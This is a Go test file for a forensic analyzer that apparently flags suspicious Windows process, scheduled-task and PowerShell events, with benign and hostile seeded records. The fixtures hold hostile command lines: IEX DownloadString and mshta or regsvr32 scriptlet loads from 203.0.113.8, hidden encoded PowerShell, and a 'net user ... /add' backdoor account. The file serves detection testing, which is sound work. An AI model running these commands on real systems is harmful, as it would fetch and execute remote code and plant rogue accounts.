package api

import (
	"net/http"
	"strings"
	"testing"
	"time"

	"tracefall/internal/model"
)

// Normalized/store-seeded software proof, not a claim of native-reader fidelity.
func TestAnalyze_InvocationNoiseControlsAndReport(t *testing.T) {
	mux, svc := newTestRouterWithService(t)
	c := mustCreateCase(t, mux, "Invocation controls")
	at := time.Date(2026, 1, 15, 9, 0, 0, 0, time.UTC)
	events := []model.Event{
		{ID: "routine-shell", EventType: model.EventProcessCreate, ProcessName: "cmd.exe", ParentProcessName: "cmd.exe"},
		{ID: "routine-task", EventType: model.EventScheduledTaskCreate, ProcessName: "tool.exe", CommandLine: `C:\ProgramData\Vendor\tool.exe /daily`},
		{ID: "literal-search", EventType: model.EventPowerShellScript, CommandLine: `Get-Content C:\Tools\audit.txt | Select-String -Pattern '-enc|IEX|DownloadString'`},
		{ID: "hostile-shell", EventType: model.EventProcessCreate, ProcessName: "cmd.exe", ParentProcessName: "cmd.exe", CommandLine: `cmd.exe /c powershell.exe -w hidden -enc AAAA`},
		{ID: "hostile-task", EventType: model.EventScheduledTaskCreate, ProcessName: "mshta.exe", CommandLine: `C:\Windows\System32\mshta.exe https://203.0.113.8/a.hta`, Extra: map[string]string{"task_name": `\Microsoft\Windows\Maintenance\Daily`, "evidence_kind": "task_configuration"}},
		{ID: "hostile-script", EventType: model.EventPowerShellScript, CommandLine: `IEX ([Convert]::FromBase64String($value)); net user alice DummySecret42 /add`},
		{ID: "unknown-encoded", EventType: model.EventProcessCreate, ProcessName: "powershell.exe", CommandLine: `powershell.exe -nop -enc AAAA`},
		{ID: "host-options-task", EventType: model.EventScheduledTaskCreate, ProcessName: "powershell.exe", CommandLine: `powershell.exe -InputFormat Text -w hidden -enc AAAA`},
		{ID: "escaped-script", EventType: model.EventPowerShellScript, CommandLine: "Write-Output `#; IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.8/a')"},
		{ID: "encoded-order-shell", EventType: model.EventProcessCreate, ProcessName: "cmd.exe", ParentProcessName: "cmd.exe", CommandLine: `cmd.exe /c powershell.exe -enc AAAA -w hidden`},
		{ID: "writable-script-task", EventType: model.EventScheduledTaskCreate, ProcessName: "wscript.exe", CommandLine: `C:\Windows\System32\wscript.exe "C:\Users\alice\AppData\Local\Temp\job.vbs"`},
		{ID: "remote-data-task", EventType: model.EventScheduledTaskCreate, ProcessName: "wscript.exe", CommandLine: `wscript.exe C:\Tools\audit.vbs https://203.0.113.8/api`},
		{ID: "unc-data-task", EventType: model.EventScheduledTaskCreate, ProcessName: "cscript.exe", CommandLine: `cscript.exe C:\Tools\audit.vbs \\host01\share\data.txt`},
		{ID: "independent-dll", EventType: model.EventScheduledTaskCreate, ProcessName: "regsvr32.exe", CommandLine: `regsvr32.exe /s /i:local \\host01\share\scrobj.dll`},
		{ID: "local-dll", EventType: model.EventScheduledTaskCreate, ProcessName: "regsvr32.exe", CommandLine: `regsvr32.exe /s /i:local C:\Temp\scrobj.dll`},
		{ID: "quoted-install", EventType: model.EventScheduledTaskCreate, ProcessName: "regsvr32.exe", CommandLine: `regsvr32.exe /s /n /u /i:"https://203.0.113.8/a.sct" scrobj.dll`},
		{ID: "token-hash", EventType: model.EventPowerShellScript, CommandLine: `Write-Output foo#bar; IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.8/a'); net user alice DummySecret42 /add`},
		{ID: "standalone-comment", EventType: model.EventPowerShellScript, CommandLine: `Write-Output foo #bar; IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.8/a')`},
		{ID: "install-data", EventType: model.EventScheduledTaskCreate, ProcessName: "regsvr32.exe", CommandLine: `regsvr32.exe /i:"https://203.0.113.8/data" C:\Tools\audit.dll`},
		{ID: "local-data", EventType: model.EventScheduledTaskCreate, ProcessName: "wscript.exe", CommandLine: `wscript.exe C:\Tools\audit.vbs C:\Temp\data.vbs`},
	}
	col := model.Collection{ID: "controls-collection", CaseID: c.ID, SourceType: model.SourceTypeLegacy, IngestionStatus: model.CollectionStatusPending}
	sf := model.SourceFile{ID: "controls-source", CaseID: c.ID, CollectionID: col.ID, OriginalFilename: "normalized.json", Path: "normalized.json", ImportStatus: model.SourceFileImported, Supported: true, Parser: "normalized-software-proof", ArtifactType: model.ArtifactWindowsEventLog}
	if err := svc.store.CreateCollectionWithSourceFiles(col, []model.SourceFile{sf}); err != nil {
		t.Fatal(err)
	}
	for i := range events {
		events[i].CaseID = c.ID
		events[i].CollectionID = col.ID
		events[i].SourceFileID = sf.ID
		events[i].Host = "host01"
		events[i].User = "alice"
		events[i].Timestamp = at.Add(time.Duration(i) * time.Minute)
		events[i].DedupHash = events[i].ID
		events[i].ArtifactType = model.ArtifactWindowsEventLog
	}
	if err := svc.store.SaveEvents(events); err != nil {
		t.Fatal(err)
	}
	rec := doJSON(t, mux, "POST", "/api/cases/"+c.ID+"/analyze", nil, nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("analyze: %d %s", rec.Code, rec.Body.String())
	}
	fs := getFindings(t, mux, c.ID)
	selected := map[string]model.Finding{}
	for _, f := range fs {
		if f.RuleID != "suspicious-process-chain" && f.RuleID != "new-scheduled-task" && f.RuleID != "powershell-encoded-command" {
			continue
		}
		if len(f.SupportingEvents) != 1 {
			t.Fatal("expected event-level lead")
		}
		selected[f.SupportingEvents[0]] = f
		if strings.Contains(f.Description, "DummySecret42") {
			t.Fatal("finding secret leak")
		}
	}
	if len(selected) != 12 {
		t.Fatalf("selected %d leads want 12: %+v", len(selected), selected)
	}
	for _, id := range []string{"hostile-shell", "hostile-task", "hostile-script", "host-options-task", "escaped-script", "encoded-order-shell", "independent-dll", "quoted-install", "token-hash"} {
		if selected[id].Severity != model.SeverityHigh {
			t.Fatalf("lost positive %s", id)
		}
	}
	if selected["unknown-encoded"].Severity != model.SeverityMedium {
		t.Fatal("unknown encoded lead lost or over-escalated")
	}
	if f := selected["local-dll"]; f.Severity != model.SeverityMedium || f.Confidence != model.ConfidenceLow {
		t.Fatal("independent local DLL lost medium/low lead")
	}
	for _, id := range []string{"remote-data-task", "unc-data-task", "standalone-comment", "install-data", "local-data"} {
		if _, ok := selected[id]; ok {
			t.Fatalf("data/comment selected: %s", id)
		}
	}
	if f := selected["writable-script-task"]; f.Severity != model.SeverityMedium || f.Confidence != model.ConfidenceLow {
		t.Fatal("writable script target lost medium/low lead")
	}
	inv := getInvestigations(t, mux, c.ID)
	if len(inv) == 0 {
		t.Fatal("no investigations for positive controls")
	}
	for _, v := range inv {
		getInvestigationDetail(t, mux, c.ID, v.ID)
	}
	rec = rawGet(t, mux, "/api/cases/"+c.ID+"/report.html")
	if rec.Code != http.StatusOK {
		t.Fatalf("report: %d %s", rec.Code, rec.Body.String())
	}
	html := rec.Body.String()
	for _, s := range []string{"Scheduled Task configuration", "does not establish", "author-recorded"} {
		if !strings.Contains(html, s) {
			t.Fatalf("report missing %q", s)
		}
	}
	if strings.Contains(html, "DummySecret42") {
		t.Fatal("report secret leak")
	}
	stored, err := svc.store.ListEvents(c.ID)
	if err != nil || len(stored) != len(events) {
		t.Fatalf("raw events changed: %d %v", len(stored), err)
	}
}
